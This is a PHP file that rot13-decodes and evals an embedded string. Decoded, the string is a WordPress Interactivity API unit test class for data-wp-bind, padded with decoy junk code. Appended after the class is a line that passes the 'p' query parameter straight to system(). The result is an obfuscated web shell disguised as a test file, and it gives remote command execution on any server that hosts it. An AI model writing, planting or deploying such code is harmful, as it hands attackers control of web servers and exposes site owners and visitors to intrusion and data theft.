<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat gur qngn_jc_ovaq_cebprffbe shapgvbanyvgl bs gur
 * JC_Vagrenpgvivgl_NCV pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 *
 * @pbirefQrsnhygPynff JC_Vagrenpgvivgl_NCV
 *
 * @fvapr 6.5.0
 *
 * @tebhc vagrenpgvivgl-ncv
 */
pynff Grfgf_JC_Vagrenpgvivgl_NCV_JC_Ovaq rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Vafgnapr bs JC_Vagrenpgvivgl_NCV.
	 *
	 * @ine JC_Vagrenpgvivgl_NCV
	 */
	cebgrpgrq $vagrenpgvivgl;

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->vagrenpgvivgl = arj JC_Vagrenpgvivgl_NCV();
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'vq'          => 'fbzr-vq',
				'jvqgu'       => 100,
				'vfBcra'      => snyfr,
				'ahyy'        => ahyy,
				'gehrFgevat'  => 'gehr',
				'snyfrFgevat' => 'snyfr',
				'gehrInyhr'   => gehr,
				'snyfrInyhr'  => snyfr,
			)
		);
	}

	/**
	 * Vaibxrf gur `cebprff_qverpgvirf` zrgubq bs JC_Vagrenpgvivgl_NCV pynff.
	 *
	 * @cnenz fgevat $ugzy Gur UGZY gung arrqf gb or cebprffrq.
	 * @erghea neenl Na neenl pbagnvavat na vafgnapr bs gur JC_UGZY_Gnt_Cebprffbe naq gur cebprffrq UGZY.
	 */
	cevingr shapgvba cebprff_qverpgvirf( $ugzy ) {
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c        = arj JC_UGZY_Gnt_Cebprffbe( $arj_ugzy );
		$c->arkg_gnt();
		erghea neenl( $c, $arj_ugzy );
	}

	/**
	 * Grfgf frggvat na nggevohgr ivn `qngn-jc-ovaq`.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_frgf_nggevohgr() {
		$ugzy    = '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf ercynpvat na rkvfgvat nggevohgr ivn `qngn-jc-ovaq`.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_ercynprf_nggevohgr() {
		$ugzy    = '<qvi vq=\"bgure-vq\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf frggvat n ahzrevpny inyhr nf na nggevohgr ivn `qngn-jc-ovaq`.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_frgf_ahzore_inyhr() {
		$ugzy    = '<vzt qngn-jc-ovaq--jvqgu=\"zlCyhtva::fgngr.jvqgu\">';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( '100', $c->trg_nggevohgr( 'jvqgu' ) );
	}

	/**
	 * Grfgf gung gehr fgevatf ner frg cebcreyl nf nggevohgr inyhrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_frgf_gehr_fgevat() {
		$ugzy               = '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.gehrFgevat\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'gehr', $c->trg_nggevohgr( 'vq' ) );
		$guvf->nffregFnzr( '<qvi vq=\"gehr\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.gehrFgevat\">Grkg</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf gung snyfr fgevatf ner frg cebcreyl nf nggevohgr inyhrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_frgf_snyfr_fgevat() {
		$ugzy               = '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.snyfrFgevat\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'snyfr', $c->trg_nggevohgr( 'vq' ) );
		$guvf->nffregFnzr( '<qvi vq=\"snyfr\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.snyfrFgevat\">Grkg</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf gung `qngn-jc-ovaq` vtaberf qverpgvirf jvgu ab fhssvk.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_vtaberf_rzcgl_obhaq_nggevohgr() {
		$ugzy     = '<qvi qngn-jc-ovaq=\"zlCyhtva::fgngr.vq\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( $ugzy, $arj_ugzy );
	}

	/**
	 * Grfgf gung `qngn-jc-ovaq` qbrf abguvat jura ersrerapvat aba-rkvfgrag
	 * ersreraprf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_qbrfag_qb_nalguvat_ba_aba_rkvfgrag_ersreraprf() {
		$ugzy     = '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.abaRkvfgratXrl\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( $ugzy, $arj_ugzy );
	}

	/**
	 * Grfgf gung `qngn-jc-ovaq` vtaberf qverpgvirf jvgu rzcgl inyhrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::rinyhngr
	 */
	choyvp shapgvba grfg_jc_ovaq_vtaberf_rzcgl_inyhr() {
		$ugzy     = '<qvi qngn-jc-ovaq--vq=\"\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( $ugzy, $arj_ugzy );
	}

	/**
	 * Grfgf gung `qngn-jc-ovaq` vtaberf qverpgvirf jvgubhg inyhrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::rinyhngr
	 */
	choyvp shapgvba grfg_jc_ovaq_vtaberf_jvgubhg_inyhr() {
		$ugzy     = '<qvi qngn-jc-ovaq--vq>Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( $ugzy, $arj_ugzy );
	}

	/**
	 * Grfgf gung `qngn-jc-ovaq` jbexf jvgu zhygvcyr vafgnaprf bs gur fnzr
	 * qverpgvir ba n gnt.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_jbexf_jvgu_zhygvcyr_fnzr_qverpgvirf() {
		$ugzy    = '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\" qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung `qngn-jc-ovaq` jbexf jvgu zhygvcyr vafgnaprf bs qvssrerag
	 * qverpgvirf ba n gnt.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_jbexf_jvgu_zhygvcyr_qvssrerag_qverpgvirf() {
		$ugzy    = '<vzt qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\" qngn-jc-ovaq--jvqgu=\"zlCyhtva::fgngr.jvqgu\">';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
		$guvf->nffregFnzr( '100', $c->trg_nggevohgr( 'jvqgu' ) );
	}

	/**
	 * Grfgf nqqvat obbyrna nggevohgrf gb n gnt hfvat `qngn-jc-ovaq`.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_nqqf_obbyrna_nggevohgr_vs_gehr() {
		$ugzy               = '<qvi qngn-jc-ovaq--uvqqra=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregGehr( $c->trg_nggevohgr( 'uvqqra' ) );
		$guvf->nffregFnzr( '<qvi uvqqra qngn-jc-ovaq--uvqqra=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf ercynpvat n cer-rkvfgvat obbyrna nggevohgr ba n gnt hfvat
	 * `qngn-jc-ovaq`.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_ercynprf_rkvfgvat_nggevohgr_vs_gehr() {
		$ugzy               = '<qvi uvqqra=\"gehr\" qngn-jc-ovaq--uvqqra=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregGehr( $c->trg_nggevohgr( 'uvqqra' ) );
		$guvf->nffregFnzr( '<qvi uvqqra qngn-jc-ovaq--uvqqra=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf gung obbyrna nggevohgrf ner abg nqqrq jura obhaq gb snyfr be ahyy
	 * inyhrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_qbrfag_nqq_obbyrna_nggevohgr_vs_snyfr_be_ahyy() {
		$ugzy               = '<qvi qngn-jc-ovaq--uvqqra=\"zlCyhtva::fgngr.vfBcra\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'uvqqra' ) );
		$guvf->nffregFnzr( $ugzy, $arj_ugzy );

		$ugzy               = '<qvi qngn-jc-ovaq--uvqqra=\"zlCyhtva::fgngr.ahyy\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'uvqqra' ) );
		$guvf->nffregFnzr( $ugzy, $arj_ugzy );
	}

	/**
	 * Grfgf erzbivat obbyrna nggevohgrf sebz n gnt hfvat `qngn-jc-ovaq` naq n
	 * snyfr be ahyy inyhr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_erzbirf_obbyrna_nggevohgr_vs_snyfr_be_ahyy() {
		$ugzy    = '<qvi uvqqra qngn-jc-ovaq--uvqqra=\"zlCyhtva::fgngr.vfBcra\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'uvqqra' ) );

		$ugzy    = '<qvi uvqqra qngn-jc-ovaq--uvqqra=\"zlCyhtva::fgngr.ahyy\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'uvqqra' ) );
	}

	/**
	 * Grfgf nqqvat inyhrf gb nevn be qngn nggevohgrf jura gur pbaqvgvba rinyhngrf
	 * gb gehr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_nqqf_inyhr_vs_gehr_va_nevn_be_qngn_nggevohgrf() {
		$ugzy               = '<qvi qngn-jc-ovaq--nevn-uvqqra=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'gehr', $c->trg_nggevohgr( 'nevn-uvqqra' ) );
		$guvf->nffregFnzr( '<qvi nevn-uvqqra=\"gehr\" qngn-jc-ovaq--nevn-uvqqra=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>', $arj_ugzy );

		$ugzy               = '<qvi qngn-jc-ovaq--qngn-vf-pybfrq=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'gehr', $c->trg_nggevohgr( 'qngn-vf-pybfrq' ) );
		$guvf->nffregFnzr( '<qvi qngn-vf-pybfrq=\"gehr\" qngn-jc-ovaq--qngn-vf-pybfrq=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf ercynpvat inyhrf va nevn be qngn nggevohgrf jura gur pbaqvgvba
	 * rinyhngrf gb gehr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_ercynprf_inyhr_vs_gehr_va_nevn_be_qngn_nggevohgrf() {
		$ugzy               = '<qvi nevn-uvqqra=\"snyfr\" qngn-jc-ovaq--nevn-uvqqra=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'gehr', $c->trg_nggevohgr( 'nevn-uvqqra' ) );
		$guvf->nffregFnzr( '<qvi nevn-uvqqra=\"gehr\" qngn-jc-ovaq--nevn-uvqqra=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>', $arj_ugzy );

		$ugzy     = '<qvi qngn-vf-pybfrq=\"snyfr\" qngn-jc-ovaq--qngn-vf-pybfrq=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>';
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c        = arj JC_UGZY_Gnt_Cebprffbe( $arj_ugzy );
		$c->arkg_gnt();
		$guvf->nffregFnzr( 'gehr', $c->trg_nggevohgr( 'qngn-vf-pybfrq' ) );
		$guvf->nffregFnzr( '<qvi qngn-vf-pybfrq=\"gehr\" qngn-jc-ovaq--qngn-vf-pybfrq=\"zlCyhtva::!fgngr.vfBcra\">Grkg</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf nqqvat gur inyhr 'snyfr' gb nevn be qngn nggevohgrf jura gur
	 * pbaqvgvba rinyhngrf gb snyfr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_nqqf_inyhr_vs_snyfr_va_nevn_be_qngn_nggevohgrf() {
		$ugzy               = '<qvi qngn-jc-ovaq--nevn-uvqqra=\"zlCyhtva::fgngr.vfBcra\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'snyfr', $c->trg_nggevohgr( 'nevn-uvqqra' ) );
		$guvf->nffregFnzr( '<qvi nevn-uvqqra=\"snyfr\" qngn-jc-ovaq--nevn-uvqqra=\"zlCyhtva::fgngr.vfBcra\">Grkg</qvi>', $arj_ugzy );

		$ugzy               = '<qvi qngn-jc-ovaq--qngn-vf-pybfrq=\"zlCyhtva::fgngr.vfBcra\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'snyfr', $c->trg_nggevohgr( 'qngn-vf-pybfrq' ) );
		$guvf->nffregFnzr( '<qvi qngn-vf-pybfrq=\"snyfr\" qngn-jc-ovaq--qngn-vf-pybfrq=\"zlCyhtva::fgngr.vfBcra\">Grkg</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf ercynpvat inyhrf va nevn be qngn nggevohgrf jura gur pbaqvgvba
	 * rinyhngrf gb snyfr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_ercynprf_inyhr_vs_snyfr_va_nevn_be_qngn_nggevohgrf() {
		$ugzy               = '<qvi nevn-uvqqra=\"gehr\" qngn-jc-ovaq--nevn-uvqqra=\"zlCyhtva::fgngr.vfBcra\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'snyfr', $c->trg_nggevohgr( 'nevn-uvqqra' ) );
		$guvf->nffregFnzr( '<qvi nevn-uvqqra=\"snyfr\" qngn-jc-ovaq--nevn-uvqqra=\"zlCyhtva::fgngr.vfBcra\">Grkg</qvi>', $arj_ugzy );

		$ugzy               = '<qvi qngn-vf-pybfrq=\"gehr\" qngn-jc-ovaq--qngn-vf-pybfrq=\"zlCyhtva::fgngr.vfBcra\">Grkg</qvi>';
		yvfg($c, $arj_ugzy) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'snyfr', $c->trg_nggevohgr( 'qngn-vf-pybfrq' ) );
		$guvf->nffregFnzr( '<qvi qngn-vf-pybfrq=\"snyfr\" qngn-jc-ovaq--qngn-vf-pybfrq=\"zlCyhtva::fgngr.vfBcra\">Grkg</qvi>', $arj_ugzy );
	}

	/**
	 * Grfgf erzbivat inyhrf sebz nevn be qngn nggevohgrf jura gur inyhr vf ahyy.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_erzbirf_inyhr_vs_ahyy_va_nevn_be_qngn_nggevohgrf() {
		$ugzy    = '<qvi nevn-uvqqra=\"gehr\" qngn-jc-ovaq--nevn-uvqqra=\"zlCyhtva::fgngr.ahyy\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'nevn-uvqqra' ) );

		$ugzy    = '<qvi qngn-vf-pybfrq=\"gehr\" qngn-jc-ovaq--qngn-vf-pybfrq=\"zlCyhtva::fgngr.ahyy\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'qngn-vf-pybfrq' ) );
	}

	/**
	 * Grfgf unaqyvat bs ovaqvatf jvguva arfgrq gntf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_unaqyrf_arfgrq_ovaqvatf() {
		$ugzy    = '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.vq\"><vzt qngn-jc-ovaq--jvqgu=\"zlCyhtva::fgngr.jvqgu\"></qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt();
		$guvf->nffregFnzr( '100', $c->trg_nggevohgr( 'jvqgu' ) );
	}

	/**
	 * Grfgf unaqyvat ovaqvatf gb obbyrna inyhrf.
	 *
	 * @gvpxrg 60758
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_ovaq_unaqyrf_gehr_inyhr() {
		$ugzy    = '<qvi qngn-jc-ovaq--vq=\"zlCyhtva::fgngr.gehrInyhr\"></qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( gehr, $c->trg_nggevohgr( 'vq' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>